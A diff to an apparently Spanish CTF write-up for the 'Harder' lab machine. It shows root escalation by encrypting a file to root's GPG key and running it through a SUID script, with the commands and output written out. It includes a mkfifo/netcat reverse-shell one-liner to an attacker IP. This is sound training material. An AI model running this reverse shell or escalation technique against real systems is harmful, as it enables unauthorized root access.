@@ -354,7 +354,7 @@ Bingo el script trae sorpresa credenciales para conectarnos por ssh  con el usua
 
 Existen dos metodos para llegar a ser root desde el usuario evs.
 
-Metodo 1: Mediante firma GNU Privacy Guard (GPG)
+### Metodo 1: Mediante firma GNU Privacy Guard (GPG)
 
 --Buscamos binarios que tengan el SUID activo
 
@@ -392,4 +392,102 @@ Metodo 1: Mediante firma GNU Privacy Guard (GPG)
 				export GNUPGHOME=/root/.gnupg/
 				gpg --decrypt --no-verbose "$1" | ash
 			fi
+
+Dicho script lo que hace es desencriptar y ejecutar el fichero(que contine instrucciones) firmado con la firma root@harder.local, que posteriormente sera ejecutado de la siguiente manera
+
+	execute-crypted command.gpg
+
+---
+Para llevar a cabo este proceso necesitamos la firma de root, firmaremos nuestro fichero para que el script pueda ejecutar nuestras instrucciones como root y llevar a elevar privilegios.
+---
+
+
+--Buscamos la fimar en la maquina, tenemos permisos de lectura y ejecucion sobre la firma ya que pertenecemos al grup evs.
+
+	harder:/usr/local/bin$ find / -name '*root@harder*' 2>/dev/null | xargs ls -la
+		-rwxr-x---    1 root     evs            641 Jul  7  2020 /var/backup/root@harder.local.pub
+
+Paso 1-Importamos la firma encontrada mediante gpg
+
+	harder:/usr/local/bin$ gpg --import /var/backup/root@harder.local.pub; gpg --list-keys
+ 
+		gpg: key C91D6615944F6874: public key "Administrator <root@harder.local>" imported
+		gpg: Total number processed: 1
+		gpg:               imported: 1
+		/home/evs/.gnupg/pubring.kbx
+		----------------------------
+		pub   ed25519 2020-07-07 [SC]
+		      6F99621E4D64B6AFCE56E864C91D6615944F6874
+		uid           [ unknown] Administrator <root@harder.local>
+		sub   cv25519 2020-07-07 [E]
+
+								
+Paso 2-Creamos el fichero que firmaremos como root el cual nos devolvera una reverse shell como usuario root.
+
+ Recordamos que tenemos que cambiar de bash a sh.
+ 
+	harder:/tmp$ echo -n 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.54.226 1988 >/tmp/f' > command
+ 
+Paso 3-Firmamos y encryptamos el fichero command.
+
+	harder:/tmp$ gpg --encrypt --recipient root@harder.local command 
+		gpg: 6C1C04522C049868: There is no assurance this key belongs to the named user
+		
+		sub  cv25519/6C1C04522C049868 2020-07-07 Administrator <root@harder.local>
+		 Primary key fingerprint: 6F99 621E 4D64 B6AF CE56  E864 C91D 6615 944F 6874
+		      Subkey fingerprint: E51F 4262 1DB8 87CB DC36  11CD 6C1C 0452 2C04 9868
+		
+		It is NOT certain that the key belongs to the person named
+		in the user ID.  If you *really* know what you are doing,
+		you may answer the next question with yes.
+		
+		Use this key anyway? (y/N) y
+  
+  
+		harder:/tmp$ ls -la         
+			total 36
+			drwxrwxrwt    1 root     root          4096 Jul 27 08:34 .
+			drwxr-xr-x    1 root     root          4096 Jul  7  2020 ..
+			-rw-r--r--    1 evs      evs             79 Jul 27 08:28 command
+			-rw-r--r--    1 evs      evs            225 Jul 27 08:34 command.gpg -----------> aqui tenemos nuestro fichero preparado.
+
+ 
+Paso 4-Ejecutamos el binario para obtener nuestra reverse shell como root.
+
+Nos ponemos en escucha preparados para recibir la shell y obtener la flag.
+
+	┌──(root㉿kali)-[/home/kali/Desktop/ctf/harder]
+	└─# nc -lnvp 1988      
+		listening on [any] 1988 ...
+		connect to [10.18.54.226] from (UNKNOWN) [10.10.123.120] 36177
+		
+  		harder:/tmp# whoami
+		root
+  
+		harder:/tmp# cd /root
+  
+		harder:/root# ls -la
+		total 24
+		drwx------    1 root     root          4096 Jul  7  2020 .
+		drwxr-xr-x    1 root     root          4096 Jul  7  2020 ..
+		lrwxrwxrwx    1 root     root             9 Jul  7  2020 .ash_history -> /dev/null
+		drwx------    1 root     root          4096 Jul 27 08:46 .gnupg
+		-rwx------    1 root     root            33 Jul  6  2020 root.txt
+  
+		harder:/root# cat root.txt
+		3a7bd726--------09f0566935a6c
+
+	
+Ejecutamos el binario para que realize todo el proceso.
+
+	harder:/tmp$ /usr/local/bin/execute-crypted command.gpg 
+		gpg: encrypted with 256-bit ECDH key, ID 6C1C04522C049868, created 2020-07-07
+		      "Administrator <root@harder.local>"
+	
+---
+---> Maquina Harder completa Metodo 1 <---
+---
+
+
+### Metodo 2: Mediante firma GNU Privacy Guard (GPG)
 
